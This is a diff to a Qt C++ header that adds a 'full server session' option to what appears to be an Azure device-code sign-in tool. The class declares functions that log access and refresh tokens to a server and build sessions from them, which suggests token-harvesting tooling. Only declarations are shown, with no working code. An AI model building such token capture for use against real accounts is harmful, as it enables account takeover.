@@ -26,6 +26,7 @@ private:
     QLineEdit *additionalScopesInput;
     QLineEdit *uaInput;
     QCheckBox *createSessionCheckbox;
+    QCheckBox *fullServerSessionCheckbox;   // server-side Connect-AzAccount full session
     QVBoxLayout *statusArea;
 
     struct StatusWidget {
@@ -45,6 +46,11 @@ private:
     bool hookConnected = false;
     bool sessionHandled = false;
 
+    // Full server-session (device code runs inside Az on the server) state
+    bool fullSessionMode = false;
+    QString fullSessionSid;
+
+    void startFullServerSession();
     void createStatusWidget(const QString &labelId);
     void logTokenToServer(const QString &accessToken, const QString &refreshToken, const QString &scope);
     void createSessionFromToken(const QString &accessToken, const QString &refreshToken, const QString &resource);
